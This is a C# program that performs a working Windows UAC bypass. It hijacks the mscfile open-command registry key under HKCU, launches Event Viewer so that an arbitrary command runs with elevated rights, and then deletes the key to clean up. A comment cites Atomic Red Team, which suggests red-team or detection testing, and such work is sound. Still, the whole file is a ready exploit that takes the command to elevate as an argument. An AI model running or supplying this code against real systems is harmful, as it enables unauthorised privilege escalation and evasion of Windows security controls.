﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

using System.Diagnostics;
using Microsoft.Win32;

namespace RegistryExample
{
    class Program
    {
        static bool DBG = true;

        static void Main(string[] args)
        {

            /* 
             * Bypass UAC using Event Viewer
             *  - ref: https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1548.002/T1548.002.md#atomic-test-2---bypass-uac-using-event-viewer-powershell
            */

            // 1. add registry entry (default value: "C:\Windows\System32\colorcpl.exe")
            string keyName = @"HKEY_CURRENT_USER\software\classes\mscfile\shell\open\command";
            const string valueName = "";
            string valueData = @"C:\Windows\System32\colorcpl.exe";

            if (args.Length == 1)
            {
                if (args[0].Equals("-h") || args[0].Equals("--help"))
                {
                    Console.WriteLine(
                        "Usage: " + args[0] + " [command]\n" +
                        "\n" +
                        " Description: Do UAC bypass by Event Viewer process\n" +
                        "\n" +
                        " Options:\n" +
                        "   command - Command to escalate with (default: " + valueData + ")\n"
                    );
                    return;
                }
                valueData = args[0];
            }

            bool ret = add_reg_entry(keyName, valueName, valueData);

            // 2. spawn a thread running "C:\Windows\System32\eventvwr.msc"
            Thread eventvwr_thread = new Thread(Program.run_eventvwr_msc);
            eventvwr_thread.Start();

            // 3. wait 8s, then delete the registry entry created before
            Thread.Sleep(8000);
            del_reg_entry(keyName.Substring(18, (keyName.IndexOf("mscfile") + 7) - 18));
            if (DBG)
                Console.WriteLine("[+] Done");
        }


        static bool add_reg_entry(string keyName, string valueName, string valueData) {
            bool ret = true;

            try
            {
                // Open the key for writing
                Registry.SetValue(keyName, valueName, valueData, RegistryValueKind.String);
                if (DBG)
                    Console.WriteLine("[!] Registry entry added successfully.");
            }
            catch (Exception ex)
            {
                if (DBG)
                    Console.WriteLine("[X] Error: " + ex.Message);
                ret = false;
            }
            return ret;
        }


        static bool del_reg_entry(string keyName)
        {
            bool ret = true;
            try
            {
                Registry.CurrentUser.DeleteSubKeyTree(keyName);
                if (DBG)
                    Console.WriteLine("[!] Registry entry deleted successfully.");
            }
            catch (Exception ex)
            {
                if (DBG)
                    Console.WriteLine("[X] Error: " + ex.Message);
                ret = false;
            }

            return ret;
        }

        static void run_eventvwr_msc(){
            string processName = @"C:\Windows\System32\eventvwr.msc";
            Process.Start(processName);
        }
    }
}

